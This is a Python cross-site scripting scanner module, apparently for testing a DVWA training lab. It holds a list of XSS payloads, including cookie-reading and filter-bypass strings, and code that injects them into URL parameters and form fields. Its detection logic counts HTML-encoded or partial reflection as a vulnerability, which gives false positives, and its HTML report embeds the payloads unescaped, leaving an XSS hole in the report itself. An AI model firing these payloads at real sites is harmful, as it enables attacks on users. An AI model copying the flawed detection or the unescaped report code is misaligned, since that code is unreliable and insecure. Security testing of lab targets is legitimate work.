# modules/xss_tester.py - Cross-Site Scripting Testing Module
import requests
import re
import json
import time
import os
import urllib.parse
from colorama import init, Fore

init(autoreset=True)

class XSSTester:
    def __init__(self, session, base_url="http://localhost:8088"):
        self.session = session
        self.base_url = base_url
        self.vulnerabilities = []
        self.payloads = self._load_xss_payloads()
        self.safe_string = "XSS_TEST_SAFE_STRING"
    
    def _load_xss_payloads(self):
        """Load XSS test payloads"""
        return [
            # Basic XSS payloads
            "<script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            
            # Reflected XSS payloads
            '"><script>alert(\'XSS\')</script>',
            "'><script>alert('XSS')</script>",
            '" onmouseover="alert(\'XSS\')"',
            "' onmouseover='alert(\"XSS\")'",
            
            # DOM XSS payloads
            "javascript:alert('XSS')",
            "JaVaScRiPt:alert('XSS')",
            
            # Encoded payloads
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            
            # Bypass attempts
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            
            # Event handlers
            '<img src="#" onerror="alert(\'XSS\')">',
            '<input type="text" value="" onfocus="alert(\'XSS\')">',
            
            # DVWA-specific payloads
            "<script>alert(1)</script>",
            "<img src=1 onerror=alert(1)>",
            "<body onload=alert(1)>",
            "<svg/onload=alert(1)>"
        ]
    
    def test_url_reflected_xss(self, url):
        """Test URL parameters for reflected XSS"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return []
        
        vulns_found = []
        
        for param in params:
            original_value = params[param][0] if params[param] else ""
            
            print(f"{Fore.CYAN}[*] Testing parameter for XSS: {param}")
            
            # Test each XSS payload
            for payload in self.payloads[:10]:  # Test first 10 payloads
                print(f"{Fore.WHITE}  Testing payload: {payload[:30]}...")
                
                # Create new params with test value
                test_params = params.copy()
                test_params[param] = [payload]
                
                # Reconstruct URL
                new_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                
                try:
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check if payload is reflected
                    if self._detect_xss_reflection(response.text, payload):
                        xss_type = self._determine_xss_type(response.text, payload)
                        
                        vuln_info = {
                            'type': xss_type,
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'method': 'GET',
                            'evidence': 'Payload reflected in response',
                            'severity': 'High',
                            'original_value': original_value
                        }
                        
                        vulns_found.append(vuln_info)
                        print(f"{Fore.RED}[!] XSS found in {param}: {payload[:30]}...")
                        break  # Stop testing this parameter if vulnerable
                    
                    time.sleep(0.3)
                    
                except Exception as e:
                    print(f"{Fore.YELLOW}[-] Error testing {param}: {e}")
                    continue
        
        return vulns_found
    
    def test_form_reflected_xss(self, form_data):
        """Test form inputs for reflected XSS"""
        vulns_found = []
        
        page_url = form_data['page_url']
        action = form_data['action']
        method = form_data['method'].upper()
        inputs = form_data['inputs']
        
        print(f"{Fore.CYAN}[*] Testing form on: {page_url}")
        
        # Only test forms that submit data
        if not inputs:
            return []
        
        # Find text-like input fields
        text_inputs = []
        for inp in inputs:
            if inp.get('name') and inp.get('type', 'text') in ['text', 'search', 'email', 'url']:
                text_inputs.append(inp)
        
        if not text_inputs:
            return []
        
        # Test each input field
        for input_field in text_inputs[:2]:  # Test first 2 fields max
            field_name = input_field['name']
            
            print(f"{Fore.WHITE}[*] Testing field: {field_name}")
            
            # Test XSS payloads
            for payload in self.payloads[:8]:  # Test first 8 payloads
                # Create form data with XSS payload
                test_data = {}
                for inp in inputs:
                    if inp.get('name'):
                        if inp['name'] == field_name:
                            test_data[inp['name']] = payload
                        else:
                            test_data[inp['name']] = inp.get('value', '')
                
                try:
                    if method == 'POST':
                        response = self.session.post(action, data=test_data, timeout=10)
                    else:
                        response = self.session.get(action, params=test_data, timeout=10)
                    
                    # Check for XSS reflection
                    if self._detect_xss_reflection(response.text, payload):
                        xss_type = self._determine_xss_type(response.text, payload)
                        
                        vuln_info = {
                            'type': xss_type,
                            'url': action,
                            'parameter': field_name,
                            'payload': payload,
                            'method': method,
                            'evidence': f'XSS payload reflected in {method} response',
                            'severity': 'High',
                            'form_page': page_url
                        }
                        
                        vulns_found.append(vuln_info)
                        print(f"{Fore.RED}[!] XSS found in form field {field_name}")
                        break  # Stop testing this field
                    
                    time.sleep(0.3)
                    
                except Exception as e:
                    print(f"{Fore.YELLOW}[-] Error testing {field_name}: {e}")
        
        return vulns_found
    
    def test_dvwa_xss_pages(self):
        """Specifically test DVWA XSS pages"""
        print(f"{Fore.YELLOW}[*] Testing DVWA XSS pages...")
        
        vulns_found = []
        
        # Test Reflected XSS page
        reflected_url = self.base_url + "/vulnerabilities/xss_r/"
        print(f"{Fore.CYAN}[*] Testing DVWA Reflected XSS: {reflected_url}")
        
        # Test with GET parameter
        test_url = reflected_url + "?name=test"
        url_vulns = self.test_url_reflected_xss(test_url)
        vulns_found.extend(url_vulns)
        
        # Test with POST
        for payload in self.payloads[:3]:
            try:
                response = self.session.post(reflected_url, data={
                    'name': payload,
                    'Submit': 'Submit'
                }, timeout=10)
                
                if self._detect_xss_reflection(response.text, payload):
                    vuln_info = {
                        'type': 'Reflected XSS',
                        'url': reflected_url,
                        'parameter': 'name (POST)',
                        'payload': payload,
                        'method': 'POST',
                        'evidence': 'XSS in DVWA Reflected XSS page',
                        'severity': 'High'
                    }
                    vulns_found.append(vuln_info)
                    print(f"{Fore.RED}[!] XSS found in DVWA Reflected XSS (POST)")
                    break
                
                time.sleep(0.5)
                
            except Exception as e:
                print(f"{Fore.YELLOW}[-] Error testing DVWA XSS: {e}")
        
        return vulns_found
    
    def _detect_xss_reflection(self, response_text, payload):
        """Detect if XSS payload is reflected in response"""
        # Check if payload appears in response
        if payload in response_text:
            return True
        
        # Check HTML encoded versions
        clean_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
        if clean_payload in response_text:
            return True
        
        # Check URL encoded
        url_encoded = urllib.parse.quote(payload)
        if url_encoded in response_text:
            return True
        
        # Check for partial reflection
        payload_parts = re.split(r'[<>\"\']', payload)
        for part in payload_parts:
            if len(part) > 5 and part in response_text:
                return True
        
        return False
    
    def _determine_xss_type(self, response_text, payload):
        """Determine the type of XSS vulnerability"""
        # Check if script tags are intact
        if '<script>' in payload.lower() and '<script>' in response_text.lower():
            return 'Reflected XSS (Script Tag)'
        
        # Check for event handlers
        event_handlers = ['onload', 'onerror', 'onclick', 'onmouseover', 'onfocus']
        for handler in event_handlers:
            if handler in payload.lower() and handler in response_text.lower():
                return f'Reflected XSS ({handler} handler)'
        
        # Check for JavaScript pseudo-protocol
        if 'javascript:' in payload.lower() and 'javascript:' in response_text.lower():
            return 'Reflected XSS (JavaScript URL)'
        
        # Check for SVG
        if '<svg' in payload.lower() and '<svg' in response_text.lower():
            return 'Reflected XSS (SVG)'
        
        # Check for img tags
        if '<img' in payload.lower() and '<img' in response_text.lower():
            return 'Reflected XSS (Image Tag)'
        
        return 'Reflected XSS'
    
    def save_results(self):
        """Save XSS test results"""
        os.makedirs("output", exist_ok=True)
        
        results = {
            'scan_type': 'Cross-Site Scripting (XSS) Test',
            'target': self.base_url,
            'total_vulnerabilities': len(self.vulnerabilities),
            'vulnerabilities': self.vulnerabilities,
            'payloads_tested': len(self.payloads),
            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # Save JSON
        with open('output/xss_results.json', 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2)
        
        # Generate HTML report
        self._generate_html_report(results)
        
        print(f"{Fore.GREEN}[+] XSS results saved to output/xss_results.json")
        return results
    
    def _generate_html_report(self, results):
        """Generate XSS HTML report"""
        # Read HTML template from separate file to avoid escape issues
        html_template = self._get_html_template(results)
        
        with open('output/xss_report.html', 'w', encoding='utf-8') as f:
            f.write(html_template)
        
        print(f"{Fore.GREEN}[+] XSS HTML report generated: output/xss_report.html")
    
    def _get_html_template(self, results):
        """Get HTML template as string"""
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>WebScanPro - XSS Test Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
        .header {{ background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%); color: white; padding: 30px; border-radius: 10px; margin-bottom: 20px; }}
        .card {{ background: #fff; border: 1px solid #ddd; border-radius: 8px; padding: 20px; margin-bottom: 20px; }}
        .stat-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }}
        .stat-box {{ background: #f8f9fa; padding: 15px; border-radius: 8px; text-align: center; }}
        .stat-number {{ font-size: 2em; font-weight: bold; }}
        .high {{ color: #e74c3c; border-left: 4px solid #e74c3c; }}
        .medium {{ color: #f39c12; border-left: 4px solid #f39c12; }}
        .low {{ color: #27ae60; border-left: 4px solid #27ae60; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th, td {{ border: 1px solid #ddd; padding: 12px; text-align: left; }}
        th {{ background: #e67e22; color: white; }}
        .vuln-row {{ background: #fff5e6; }}
        .safe-row {{ background: #eaffea; }}
        code {{ background: #2c3e50; color: #ecf0f1; padding: 2px 6px; border-radius: 3px; font-family: monospace; }}
        .payload {{ max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚠️ Cross-Site Scripting (XSS) Test Report</h1>
            <p>Generated: {results['timestamp']} | Target: {results['target']}</p>
        </div>
        
        <div class="stat-grid">
            <div class="stat-box high">
                <div class="stat-number">{results['total_vulnerabilities']}</div>
                <div>XSS Vulnerabilities Found</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{results['payloads_tested']}</div>
                <div>XSS Payloads Tested</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{len([v for v in results['vulnerabilities'] if 'Reflected' in v['type']])}</div>
                <div>Reflected XSS</div>
            </div>
        </div>"""
        
        if results['vulnerabilities']:
            html += f"""
        <div class="card">
            <h2>🔴 Detected XSS Vulnerabilities</h2>
            <table>
                <tr>
                    <th>Type</th>
                    <th>URL</th>
                    <th>Parameter</th>
                    <th>Payload</th>
                    <th>Method</th>
                    <th>Severity</th>
                </tr>"""
            
            for vuln in results['vulnerabilities']:
                severity_class = vuln['severity'].lower()
                html += f"""
                <tr class="vuln-row">
                    <td>{vuln['type']}</td>
                    <td>{vuln['url'][:40]}...</td>
                    <td>{vuln['parameter']}</td>
                    <td><code class="payload" title="{vuln['payload']}">{vuln['payload'][:30]}...</code></td>
                    <td>{vuln['method']}</td>
                    <td class="{severity_class}">{vuln['severity']}</td>
                </tr>"""
            
            html += """
            </table>
        </div>"""
        else:
            html += """
        <div class="card" style="background: #eaffea;">
            <h2 style="color: #27ae60;">✅ No XSS Vulnerabilities Found!</h2>
            <p>The application appears to be secure against Cross-Site Scripting attacks.</p>
        </div>"""
        
        html += """
        <div class="card">
            <h2>🔧 XSS Prevention Recommendations</h2>
            <h3>1. Input Validation & Sanitization</h3>
            <ul>
                <li><strong>Validate:</strong> Validate all user input against a whitelist of allowed characters</li>
                <li><strong>Sanitize:</strong> Remove or encode potentially dangerous characters (&lt; &gt; " ' & /)</li>
            </ul>
            
            <h3>2. Output Encoding</h3>
            <ul>
                <li><strong>HTML Entity Encoding:</strong> Convert &lt; to &amp;lt;, &gt; to &amp;gt;, etc.</li>
                <li><strong>JavaScript Encoding:</strong> Use proper encoding for JavaScript contexts</li>
                <li><strong>URL Encoding:</strong> Use %HH encoding for URL parameters</li>
            </ul>
            
            <h3>3. Content Security Policy (CSP)</h3>
            <ul>
                <li>Implement CSP headers to restrict sources of scripts, styles, and other resources</li>
                <li>Example: Content-Security-Policy: default-src 'self'; script-src 'self'</li>
            </ul>
            
            <h3>4. Secure Development Practices</h3>
            <ul>
                <li>Use secure frameworks that automatically handle XSS protection</li>
                <li>Avoid innerHTML, use textContent instead</li>
                <li>Use HTTPOnly flag for cookies to prevent access via JavaScript</li>
            </ul>
        </div>
        
        
    </div>
</body>
</html>"""
        
        return html